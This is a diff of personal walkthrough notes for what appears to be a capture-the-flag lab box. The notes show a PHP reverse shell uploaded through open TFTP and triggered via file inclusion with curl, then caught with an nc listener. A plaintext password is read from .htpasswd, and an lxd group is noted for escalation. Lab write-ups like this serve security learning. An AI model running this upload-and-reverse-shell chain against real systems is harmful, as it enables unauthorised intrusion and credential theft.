@@ -32,4 +32,96 @@ pollinate:x:109:1::/var/cache/pollinate:/bin/false
 mike:x:1000:1000:mike:/home/mike:/bin/bash
 tftp:x:110:113:tftp daemon,,,:/var/lib/tftpboot:/usr/sbin/nologin
 --------------------------------=====----------------------------
-2.Switched to the UDP scan identifed the any open ports.
+2.Switched to the UDP scan identifed the any open ports. There is open port TFTP and it will allowed to upload remote code files into the system.
+                                                                                                                                                            
+┌──(sabeshan㉿kali)-[~]
+└─$ head shell_rev.php                                       
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '10.10.16.20';
+$port = 1337;
+$chunk_size = 1400;
+$write_a = null;
+
+┌──(sabeshan㉿kali)-[~]
+└─$ tftp 10.129.151.160                
+tftp> dir
+?Invalid command
+tftp> ?
+tftp-hpa 5.3
+Commands may be abbreviated.  Commands are:
+
+connect         connect to remote tftp
+mode            set file transfer mode
+put             send file
+get             receive file
+quit            exit tftp
+verbose         toggle verbose mode
+trace           toggle packet tracing
+literal         toggle literal mode, ignore ':' in file name
+status          show current status
+binary          set mode to octet
+ascii           set mode to netascii
+rexmt           set per-packet transmission timeout
+timeout         set total retransmission timeout
+?               print help information
+help            print help information
+tftp> put shell_rev.php
+tftp> quit
+=============================================================================
+
+┌──(sabeshan㉿kali)-[~]
+└─$ curl http://10.129.151.160/?file=/var/lib/tftpboot/shell_rev.php
+
+──(sabeshan㉿kali)-[~]
+└─$ nc -lvnp 1337              
+listening on [any] 1337 ...
+connect to [10.10.16.20] from (UNKNOWN) [10.129.151.160] 55852
+Linux included 4.15.0-151-generic #157-Ubuntu SMP Fri Jul 9 23:07:57 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+ 13:56:07 up 50 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+bash: cannot set terminal process group (1619): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@included:/$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+www-data@included:/$ ^Z
+zsh: suspended  nc -lvnp 1337
+                                                                                                                             
+┌──(sabeshan㉿kali)-[~]
+└─$ stty raw -echo; fg           
+[1]  + continued  nc -lvnp 1337
+
+www-data@included:/$ export TERM=xterm
+www-data@included:/$ 
+----------------------------------------------------------------------
+www-data@included:/var/www/html$ ls -la
+total 88
+drwxr-xr-x 4 root     root      4096 Oct 13  2021 .
+drwxr-xr-x 3 root     root      4096 Apr 23  2021 ..
+-rw-r--r-- 1 www-data www-data   212 Apr 23  2021 .htaccess
+-rw-r--r-- 1 www-data www-data    17 Apr 23  2021 .htpasswd
+-rw-r--r-- 1 www-data www-data 13828 Apr 29  2014 default.css
+drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 fonts
+-rw-r--r-- 1 www-data www-data 20448 Apr 29  2014 fonts.css
+-rw-r--r-- 1 www-data www-data  3704 Oct 13  2021 home.php
+drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 images
+-rw-r--r-- 1 www-data www-data   145 Oct 13  2021 index.php
+-rw-r--r-- 1 www-data www-data 17187 Apr 29  2014 license.txt
+www-data@included:/var/www/html$ cat .htpasswd
+mike:Sheffield19
+www-data@included:/var/www/html$ 
+mike@included:~$ groups
+mike lxd
+mike@included:~$ 
+--------------------------------------------------------------------------
+
+
+
+
+
+
